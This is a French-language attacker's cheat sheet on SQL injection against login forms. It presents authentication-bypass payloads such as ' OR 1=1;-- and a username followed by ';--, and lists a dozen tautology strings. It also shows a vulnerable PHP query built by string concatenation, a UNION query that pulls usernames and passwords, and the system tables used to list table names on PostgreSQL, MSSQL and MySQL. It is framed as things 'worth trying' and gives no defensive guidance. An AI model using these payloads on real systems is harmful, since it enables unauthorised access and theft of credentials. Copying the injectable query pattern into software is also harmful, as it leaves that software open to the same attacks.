# Injection de commandes SQL

## 1. Se connecter sans identifiant et sans mot de passe

On tape dans l'identifiant : 

```sql
' OR 1=1 ;--
```

Et on n'oublie pas de mettre un mot de passe aléatoire, au cas ou le système vérifie si un mot de passe est rentré.

## 2. Se connecter avec seulement l'identifiant

#### 1. Par le nom d'utilisateur

Dans un premier temps, on peut s'attaquer au _**nom d'utilisateur**_. Prenons par exemple, une requête de connexion au serveur de ce type :

```sql
select * from user_table
where username = 'anto'
and password = 'mystrongpassword';
```

En supposant que le mot de passe ne soit pas haché, la requête PHP ressemblerait à ceci :

```php
// Connexion à la database
$db_query = "select * from user_table where
username = '".$user."'
AND password = '".$password."';";
// Execution de la requête
```

Ainsi, en entrant dans la section du nom d'utilisateur « **anto’;--** » la requête SQL devient :

```sql
select * from user_table where
username = 'anto';-- and password = ''
```

Or, le double tiret permet de commenter du code en SQL, ce qui revient donc à contourner le mot de passe, et à pouvoir se connecter en ayant uniquement besoin du nom d'utilisateur.



#### 2. Par le mot de passe, par attaque booléenne 

Une deuxième possibilité à tester, est l'injection SQL booléenne. Par exemple, en ayant une requête SQL de ce type :

```sql
select * from user_table where
username = 'anto' and
password = 'password';
```

On peut très bien contourner le mot de passe, en entrant dans la section du mot de passe la commande « **'or 1=1;--** » qui transforme la requête comme ceci :

```sql
select * from user_table where
username = 'anto' and
password = 'password' or 1=1;--;
```

Et qui de ce fait, rend totalement inutile la condition password='anto' vu que la condition 1=1 sera toujours vraie.

Il existe une infinité de conditions triviales, par exemple :

```sql
'='
'OR 1=1
'OR a=a
'OR'
'OR''='
'OR"="
'OR'="
'OR '="
'OR "='
'OR ''='
'OR '=''
'OR "=''
'OR ''="
```



{% hint style="warning" %}
Malheureusement pour nous, ces genres de vulnérabilités sont extrêmement rares, mais valent le coup d'être essayés.
{% endhint %}

## 3. Par méthode UNION

#### Les objectifs de cette techniques sont :

* Trouver le nombre et le type de chaque colonne retournée par la requête
* Trouver le nom d'une colonne et d'une table comportant des choses intéressantes \(Login, Password, etc.\)
* Utiliser une union pour récupérer les informations

```sql
select title, link from post_table
where id < 10
union
select username, password
from user_table; --;
```

{% hint style="info" %}
Pour une base PostgreSQL, la colonne tablename de la table **pg\_tables** va permettre de récupérer le nom des tables, pour MSSQL, select name from **SysObjects**, pour MySQL, select table\_name from **information\_schema.tables .**
{% endhint %}



